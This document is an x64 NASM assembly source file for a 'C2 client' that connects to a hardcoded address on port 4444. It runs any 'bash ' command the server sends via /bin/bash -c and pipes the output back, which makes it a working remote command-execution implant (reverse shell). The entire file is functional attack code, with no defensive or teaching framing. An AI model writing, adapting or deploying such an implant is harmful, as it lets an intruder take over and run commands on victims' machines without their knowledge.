;------------------------------
; client.asm – C2 Client in NASM x64
; The client can now respond to PING
; and execute bash commands sent by the server.
;------------------------------
global _start

section .data
    server_addr:
       dw 2             ; AF_INET
       dw 0x5c11        ; port 4444 (0x115c → 0x5c11 in little-endian)
       ;dd 0x0100007f    ; 127.0.0.1 (0x7F000001)
       dd 0x1701a8c0
       times 8 db 0
    server_addr_len equ 16

    newline_str       db 10, 0
    server_msg_prefix db "From server: ", 0
    pong_str          db "PONG", 10   ; "PONG\n" (5 bytes)

    ; Strings for bash command execution
    bash_path db "/bin/bash", 0
    arg_c     db "-c", 0

section .bss
    buf      resb 1024         ; Receive/send buffer
    ; pollfd array with 2 entries:
    ;   pollfds[0]: client socket
    ;   pollfds[1]: STDIN (fd 0)
    pollfds  resb 2*8
    ; Space for 2 ints (4 bytes each) for pipe
    pipefd   resd 2

section .text

_start:
    ; Create client socket (sys_socket = 41)
    mov rax, 41
    mov rdi, 2          ; AF_INET
    mov rsi, 1          ; SOCK_STREAM
    mov rdx, 0
    syscall
    ; Save socket fd in r12 (server communication)
    mov r12, rax

    ; Connect to server (sys_connect = 42)
    mov rdi, r12
    lea rsi, [rel server_addr]
    mov rdx, server_addr_len
    mov rax, 42
    syscall

    ; Prepare pollfds array (2 entries)
    mov rdi, pollfds
    mov rcx, 2*8
    xor rax, rax
    rep stosb

    ; pollfds[0] = { fd = client socket, events = POLLIN (1) }
    mov qword [pollfds], r12
    mov word  [pollfds+4], 1

    ; pollfds[1] = { fd = STDIN (0), events = POLLIN (1) }
    mov dword [pollfds+8], 0
    mov word  [pollfds+8+4], 1

    mov r13, 2         ; nfds = 2

client_loop:
    ; Call poll (sys_poll = 7, timeout = -1)
    lea rdi, [pollfds]
    mov rsi, r13
    mov rdx, -1
    mov rax, 7
    syscall
    cmp rax, 0
    jl client_exit

    xor r14, r14       ; r14 will be the pollfds entry index

.poll_loop_client:
    cmp r14, r13
    jge .after_poll_loop_client

    mov rcx, r14
    shl rcx, 3         ; rcx = r14 * 8 (each pollfd is 8 bytes)
    lea rbx, [pollfds + rcx]
    movzx rax, word [rbx+6]
    test rax, rax
    jz .next_poll_client

    ; Use CALL to handle events to avoid RET issues
    cmp r14, 0
    je .handle_server_message_call
    cmp r14, 1
    je .handle_stdin_client_call
    jmp .next_poll_client

.handle_server_message_call:
    call .handle_server_message
    jmp .next_poll_client

.handle_stdin_client_call:
    call .handle_stdin_client
    jmp .next_poll_client

.next_poll_client:
    inc r14
    jmp .poll_loop_client

.after_poll_loop_client:
    jmp client_loop

;---------------------------------------------------------------
; Routine: .handle_server_message
; Reads message from socket and processes:
;   - If message starts with "bash ", calls .handle_bash_command.
;   - Otherwise, if "PING" is received, responds with "PONG\n".
.handle_server_message:
    ; Read message from socket (fd in r12)
    mov rdi, r12
    lea rsi, [buf]
    mov rdx, 1024
    mov rax, 0         ; sys_read
    syscall
    cmp rax, 0
    jle .clear_revents_client
    mov rbx, rax       ; rbx = bytes read

    ; Optional STDOUT display
    lea rdi, [rel server_msg_prefix]
    call print_string
    mov rdi, 1
    lea rsi, [buf]
    mov rdx, rbx
    mov rax, 1         ; sys_write
    syscall
    lea rdi, [rel newline_str]
    call print_string

    ; Check for bash command: "bash " (min 5 bytes)
    cmp rbx, 5
    jb .check_ping
    mov eax, dword [buf]       ; compare first 4 bytes
    cmp eax, 0x68736162        ; "bash" in little-endian
    jne .check_ping
    mov al, byte [buf+4]
    cmp al, 0x20               ; must be a space
    jne .check_ping
    ; It's a bash command, call handler
    call .handle_bash_command
    jmp .clear_revents_client

.check_ping:
    ; Check for PING (4 bytes)
    cmp rbx, 4
    jb .clear_revents_client
    mov eax, dword [buf]
    cmp eax, 0x474e4950        ; "PING" in little-endian
    jne .clear_revents_client
    ; Respond to PING with "PONG\n"
    mov rdi, r12
    lea rsi, [rel pong_str]
    mov rdx, 5
    mov rax, 1         ; sys_write
    syscall

.clear_revents_client:
    ; Reset revents field for pollfds[0]
    mov rcx, 0
    shl rcx, 3
    lea rbx, [pollfds + rcx]
    mov word [rbx+6], 0
    ret

;---------------------------------------------------------------
; Routine: .handle_stdin_client
; Reads message from STDIN and sends to server.
.handle_stdin_client:
    mov rdi, 0
    lea rsi, [buf]
    mov rdx, 1024
    mov rax, 0         ; sys_read
    syscall
    cmp rax, 0
    jle .clear_revents_client_stdin
    mov rdi, r12
    lea rsi, [buf]
    mov rdx, rax
    mov rax, 1         ; sys_write
    syscall
.clear_revents_client_stdin:
    ; Reset revents field for pollfds[1]
    mov rcx, 1
    shl rcx, 3
    lea rbx, [pollfds + rcx]
    mov word [rbx+6], 0
    ret

;---------------------------------------------------------------
; Routine: .handle_bash_command
; Executes command from buf (after "bash ") and sends output to server.
.handle_bash_command:
    ; Set RDI to command string (buf+5)
    lea rdi, [buf+5]
    ; Save command pointer in RBX
    mov rbx, rdi

    ; Remove trailing newline by replacing LF (10) with 0.
    xor rcx, rcx
.remove_newline_loop:
    mov al, byte [rbx+rcx]
    cmp al, 10
    je .found_newline
    cmp al, 0
    je .done_remove
    inc rcx
    jmp .remove_newline_loop
.found_newline:
    mov byte [rbx+rcx], 0
.done_remove:
    ; Create pipe to capture output
    lea rdi, [pipefd]
    mov rsi, 0
    mov rax, 293       ; sys_pipe2
    syscall

    ; Fork (sys_fork = 57)
    mov rax, 57
    syscall
    cmp rax, 0
    je .child_process

    ; Parent process
    ; Close write end of pipe (pipefd[1])
    mov edi, dword [pipefd+4]
    mov rax, 3         ; sys_close
    syscall
.read_loop_parent:
    mov rdi, qword [pipefd]  ; pipefd[0]
    lea rsi, [buf]
    mov rdx, 1024
    mov rax, 0         ; sys_read
    syscall
    cmp rax, 0
    jle .done_read_parent
    mov rdi, r12       ; send to server socket
    lea rsi, [buf]
    mov rdx, rax
    mov rax, 1         ; sys_write
    syscall
    jmp .read_loop_parent
.done_read_parent:
    ; Close read end
    mov edi, dword [pipefd]
    mov rax, 3
    syscall
    ret

.child_process:
    ; Child: close read end of pipe
    mov edi, dword [pipefd]
    mov rax, 3
    syscall
    ; Redirect STDOUT (fd 1) and STDERR (fd 2) to pipefd[1]
    mov edi, dword [pipefd+4]
    mov esi, 1
    mov rax, 33       ; sys_dup2
    syscall
    mov edi, dword [pipefd+4]
    mov esi, 2
    mov rax, 33       ; sys_dup2
    syscall
    ; Close original write descriptor
    mov edi, dword [pipefd+4]
    mov rax, 3
    syscall

    ; Prepare args for execve("/bin/bash", ["bash", "-c", <command>, NULL], NULL)
    sub rsp, 32
    mov qword [rsp], bash_path       ; argv[0] = "/bin/bash"
    mov qword [rsp+8], arg_c         ; argv[1] = "-c"
    mov qword [rsp+16], rbx          ; argv[2] = command (saved pointer)
    mov qword [rsp+24], 0            ; argv[3] = NULL

    ; Execute /bin/bash -c <command>
    mov rdi, bash_path
    mov rsi, rsp
    xor rdx, rdx
    mov rax, 59       ; sys_execve
    syscall

    ; Exit on failure
    mov rdi, 1
    mov rax, 60
    syscall

client_exit:
    mov rdi, 0
    mov rax, 60
    syscall

;---------------------------------------------------------------
; Routine: print_string
; Prints NUL-terminated string pointed by RDI to STDOUT.
print_string:
    push rdi
    mov rsi, rdi
    xor rcx, rcx
.find_len:
    cmp byte [rsi+rcx], 0
    je .found_len
    inc rcx
    jmp .find_len
.found_len:
    mov rdx, rcx
    mov rdi, 1
    mov rax, 1
    syscall
    pop rdi
    ret